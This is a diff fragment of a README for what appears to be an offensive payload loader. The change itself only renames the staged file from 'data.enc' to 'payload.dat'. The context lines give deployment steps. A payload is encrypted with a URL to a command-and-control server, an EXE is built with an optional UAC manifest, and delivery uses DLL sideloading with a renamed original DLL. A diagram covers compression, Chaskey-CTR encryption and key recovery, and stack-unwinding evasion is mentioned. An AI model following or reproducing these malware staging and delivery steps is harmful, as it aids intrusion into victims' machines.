@@ -86,7 +86,7 @@ python Encrypt.py payload.bin --url https://<C2>:<PORT>/payload.dat
 build.bat                                  # EXE
 build.bat uac                              # EXE with UAC manifest
 
-# 3  Deploy — upload data.enc to staging server, deliver the EXE
+# 3  Deploy — upload payload.dat (URL basename) to staging server, deliver the EXE
 ```
 
 > Re-run steps 1 & 2 for a completely new binary.
@@ -132,7 +132,7 @@ build.bat sideload <target>.dll uac        # self-relaunch UAC
 # 4  Deploy
 #    Rename real <target>.dll → <target>_orig.dll
 #    Place proxy <target>.dll + <target>_orig.dll alongside host EXE
-#    Upload data.enc to staging server, run host EXE
+#    Upload payload.dat (URL basename) to staging server, run host EXE
 ```
 
 </details>
@@ -260,7 +260,7 @@ a valid handle and the stackwalker can unwind each frame.
        │                                 │
   LZNT1 compress                    Chaskey-CTR decrypt
        │                                 │
-  Chaskey-CTR encrypt ─→ data.enc ─→ LZNT1 decompress
+  Chaskey-CTR encrypt ─→ payload.dat ─→ LZNT1 decompress
        │                                 │
   key protection                    brute-force recovery
   (XOR + offset)
